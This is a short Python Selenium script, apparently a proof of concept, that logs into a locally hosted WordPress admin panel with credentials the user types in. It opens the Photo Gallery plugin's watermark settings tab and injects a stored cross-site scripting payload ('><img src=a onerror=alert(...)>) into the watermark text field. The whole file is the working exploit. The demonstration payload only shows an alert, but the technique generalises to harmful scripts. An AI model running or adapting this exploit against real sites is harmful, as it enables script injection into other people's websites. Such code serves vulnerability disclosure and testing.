import sys
from selenium import webdriver

# choose specific web driver
browser = webdriver.Firefox()

# enter root folder
print('Enter the name of the root folder of wordpress in htdocs (e.g. wordpress): ')
wordpressinfo= input()
browser.get('http://localhost/'+ wordpressinfo +'/wp-admin/admin.php?page=options_bwg#bwg_tab_watermark_content')

#login operation
username = browser.find_element_by_name("log")
password = browser.find_element_by_name("pwd")

#change please credentilas here :)
print('Enter username: ')
usernameinput = input()
username.send_keys(usernameinput)
print('Enter password: ')
passwordinput = input()
password.send_keys(passwordinput)

#click on log in
browser.find_element_by_id("wp-submit").click()

#click on interested tab
browser.find_element_by_id("ui-id-6").click()

#find input and insert malicious code
watermarktext = browser.find_element_by_name("built_in_watermark_text")
watermarktext.send_keys("'><img src = a onerror='alert(\"Malicious code\");'")

